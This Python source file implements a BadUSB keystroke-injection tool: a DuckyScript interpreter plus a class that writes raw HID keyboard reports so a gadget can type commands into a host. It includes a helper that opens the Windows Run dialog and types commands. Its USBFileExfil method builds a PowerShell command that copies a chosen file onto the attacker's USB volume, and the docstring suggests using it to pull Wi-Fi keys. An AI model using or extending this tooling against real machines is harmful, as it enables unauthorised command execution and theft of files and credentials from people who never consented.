import datetime
from time import sleep
from os import path
from random import randint
import core.badusb.keys as usbKeys

class DuckyScriptInterpreter():
    """
    a crude, shitty duckyscript implementation
    """
    def __init__(self, usb):
        self.usb = usb
        self.key = { # key for things
            "STRING": self.STRING,
            "STRINGLN": self.STRINGLN,
            "REM": self.REM,
            "ALT": self.ALT,
            "CTRL": self.CTRL,
            "SHIFT": self.SHIFT,
            "GUI": self.GUI,
            "DELAY": self.DELAY,
            "HOLD": self.HOLD,
            "RELEASE": self.RELEASE,
            "JITTER": self.JITTER,
            "PRINT": self.PRINT
        }

        self.vars = {}
        self.jitter = False
        self.percentage = 0
        self.printed = ''
        return

    def STRING(self, splitLine:list):
        self.usb.write(' '.join(splitLine), jitter=self.jitter)

    def STRINGLN(self, splitLine:list):
        self.usb.write(' '.join(splitLine), jitter=self.jitter)
        self.usb.press('ENTER')
        
    def REM(self):
        return

    def ALT(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.alt(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def CTRL(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.ctrl(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def SHIFT(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.shift(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def GUI(self, splitLine:list):
        if len(splitLine) > 1:
            noRelease = True
        else:
            noRelease = False

        self.usb.gui(splitLine[0], noRelease=noRelease)

        splitLine.pop(0)

        if len(splitLine) > 0:
            for key in splitLine:
                self.usb.press(key)

        if noRelease:
            self.usb.releaseAll()

    def DELAY(self, splitLine:list):
        sleep(float(splitLine[0]) / 10)

    def HOLD(self, splitLine:list):
        self.usb.press(splitLine[0], noRelease=True)

    def RELEASE(self, splitLine:list):
        self.usb.releaseAll()

    def JITTER(self, splitLine:list):
        try:
            self.jitter = (float(splitLine[0]), float(splitLine[1]))
        except IndexError:
            self.jitter = False

    def PRINT(self, splitLine:list):
        self.printed += ' '.join(splitLine)

    def run(self, script):
        file = open(script, "r").read().split("\n")
        for ln in file:
            line = ln.split(" ")
            base = line[0]
            line.pop(0)

            currIndex = file.index(ln)

            self.percentage = round(100 - float(
                    str( # turn decimal percentage into a string
                        "{:.0%}".format(
                            currIndex/len(
                                file # make decimal percentage
                            )
                        )
                    ).replace("%", "") # remove percentage sign
                ) # turn string back into float
            ) # round it up

            if base in self.key:
                self.key[base](line)


class BadUSB:
    def __init__(self, hidDirectory:str="/dev/hidg0", hidWriteType:str='rb+'):
        if path.exists(hidDirectory):
            pass
        else:
            raise FileNotFoundError("\"{}\" doesn't exist")

        self.hidDirectory = hidDirectory
        self.writeType=hidWriteType
        self.keyboard = open(self.hidDirectory, self.writeType)

        self.keys = usbKeys.keys
        self.shifted = usbKeys.shifted
        self.symbols = usbKeys.symbols

    def isUpper(self, string:str): return True if string.upper() == string else False

    def rawWrite(self, direct, useAdditives=False):
        """
        write exact given arg directly to hid serial
        """

        if not useAdditives:
            self.keyboard.write(direct)
        else:
            text = self.keys["null"]*2+chr(direct)+self.keys["null"]*5
            self.keyboard.write(text.encode())

        self.keyboard.flush()

    def write(self, string, keyDelay=0, jitter=False):
        """
        write a string, case sensitive, with a set keyDelay
        """
        for x in [str(x) for x in string]:       
            self.press(x)

            if jitter != False:
                sleep(randint(jitter[0], jitter[1]))
            else:
                sleep(keyDelay)
        return True

    def releaseAll(self):
        """
        release all pressed keys, always called after self.press() and self.write()
        """
        a = self.keys['null']*8
        self.rawWrite(a.encode())

    def press(self, key):
        """
        press a certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            #print("is list")
            text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt[0])+self.keys["null"]*5
            self.rawWrite(text.encode())
        else:
            if not key == key.upper(): # if lowercase
                #print("is lower")
                self.rawWrite(keyInt, useAdditives=True)
            elif key in list(self.symbols):
                #print("is special")
                self.rawWrite(keyInt, useAdditives=True)
            else: # if uppercase
                #print("is upper")
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())

        self.releaseAll()
        return True

    def ctrl(self, key, noRelease:bool=False):
        """
        ctrl + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LCTRL"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LCTRL"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LCTRL"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def shift(self, key, noRelease:bool=False):
        """
        shift + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LSHIFT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def alt(self, key, noRelease:bool=False):
        """
        alt + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LALT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LALT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LALT"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def gui(self, key, noRelease:bool=False):
        """
        gui (or meta) + certain key
        """
        try:
            keyInt = self.keys[key]
        except KeyError:
            try:
                keyInt = self.keys[key.lower()]
            except:
                try:
                    keyInt = self.shifted[key][0]
                except:
                    raise

        #print("{}: {}".format(key, keyInt))

        if type(keyInt) == list: # special shifted char
            pass # no
        else:
            if not key == key.upper(): # if lowercase
                text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            elif key in list(self.symbols):
                text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())
            else: # if uppercase, it doesnt matter
                text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(keyInt)+self.keys["null"]*5
                self.rawWrite(text.encode())

        if not noRelease:
            self.releaseAll()
        
        return True

    def run(self, string, enter=True):
        """
        use GUI+R to run something, automatically presses enter
        """

        text = chr(self.keys["LMETA"]) + self.keys["null"] + chr(self.keys["r"])+self.keys["null"]*5

        self.rawWrite(text.encode())

        sleep(0.25)

        self.write(string, keyDelay=0)

        sleep(0.1)

        if enter:
            self.press("ENTER")

        return True

    def USBFileExfil(self, filename, 
        exfilFileName="{}.txt".format(datetime.datetime.now()),
        exfilVolumeName:str="OTTERUSB",
        ):
        """exfil a file to onboard USB drive;\
            leave command empty if you want to just exfiltrate file;\
            put command if you want to do a special command like netsh wlan key show (or however it goes)
            """

        fullCmd = 'powershell "$m=(Get-Volume -FileSystemLabel \'{}\'). DriveLetter; type {}>>$m\':\{}\'"'.format(exfilVolumeName, filename, exfilFileName)

        return self.run(fullCmd)
    
    def close(self):
        """
        close the badusb stream
        """

        self.keyboard.close()
        self.keyboard = None
        return None